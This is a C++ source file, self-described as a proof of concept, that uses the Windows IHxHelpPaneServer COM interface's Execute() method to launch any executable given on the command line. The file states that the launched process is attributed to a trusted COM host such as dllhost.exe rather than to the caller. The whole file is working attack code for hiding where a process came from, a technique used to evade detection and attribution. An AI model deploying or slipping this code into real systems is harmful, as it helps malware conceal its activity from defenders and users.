#include <Windows.h>
#include <Objbase.h>
#include <stdio.h>
#include <stdlib.h>

// This PoC abuses the IHxHelpPaneServer COM interface, which exposes an
// Execute() method that launches an arbitrary process. The launched process
// is attributed to the trusted COM host (e.g., dllhost.exe) rather than to
// this executable.
//
// NOTE: this file contains C++ (interface declaration with virtual methods,
// __declspec(uuid)). It must be compiled as C++ (.cpp), not as C.

struct __declspec(uuid("{8cec592c-07a1-11d9-b15e-000d56bfe6ee}"))
    IHxHelpPaneServer : public IUnknown {
    virtual HRESULT __stdcall DisplayTask(PWCHAR) = 0;
    virtual HRESULT __stdcall DisplayContents(PWCHAR) = 0;
    virtual HRESULT __stdcall DisplaySearchResults(PWCHAR) = 0;
    virtual HRESULT __stdcall Execute(const PWCHAR) = 0;
};

HRESULT CoInitializeIHxHelpIds(LPGUID Clsid, LPGUID Iid) {
    HRESULT Result = CLSIDFromString(L"{8cec58ae-07a1-11d9-b15e-000d56bfe6ee}", Clsid);
    if (FAILED(Result)) {
        return Result;
    }
    return CLSIDFromString(L"{8cec592c-07a1-11d9-b15e-000d56bfe6ee}", Iid);
}

INT wmain(INT argc, WCHAR* argv[]) {
    if (argc != 2) {
        wprintf(L"Usage: %s <full path to the executable to launch>\n", argv[0]);
        return 1;
    }

    GUID CLSID_IHxHelpPaneServer = { 0 };
    GUID IID_IHxHelpPaneServer = { 0 };
    WCHAR fullpath[256] = { 0 };

    if (FAILED(CoInitializeIHxHelpIds(&CLSID_IHxHelpPaneServer, &IID_IHxHelpPaneServer))) {
        wprintf(L"[-] Failed to resolve the IHxHelpPaneServer CLSID/IID.\n");
        return 1;
    }

    if (swprintf_s(fullpath, _countof(fullpath), L"file:///%s", argv[1]) < 0) {
        wprintf(L"[-] Target path is too long (max %zu characters).\n", _countof(fullpath) - 1);
        return 1;
    }

    HRESULT Result = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(Result)) {
        wprintf(L"[-] CoInitializeEx failed: 0x%08lX\n", (unsigned long)Result);
        return 1;
    }

    IHxHelpPaneServer* Help = NULL;
    Result = CoCreateInstance(CLSID_IHxHelpPaneServer, NULL, CLSCTX_ALL,
        IID_IHxHelpPaneServer, (PVOID*)&Help);

    if (FAILED(Result) || Help == NULL) {
        wprintf(L"[-] CoCreateInstance failed: 0x%08lX\n", (unsigned long)Result);
        CoUninitialize();
        return 1;
    }

    Result = Help->Execute(fullpath);
    if (FAILED(Result)) {
        wprintf(L"[-] IHxHelpPaneServer::Execute failed: 0x%08lX\n", (unsigned long)Result);
    }

    Help->Release();
    CoUninitialize();

    return 0;
}
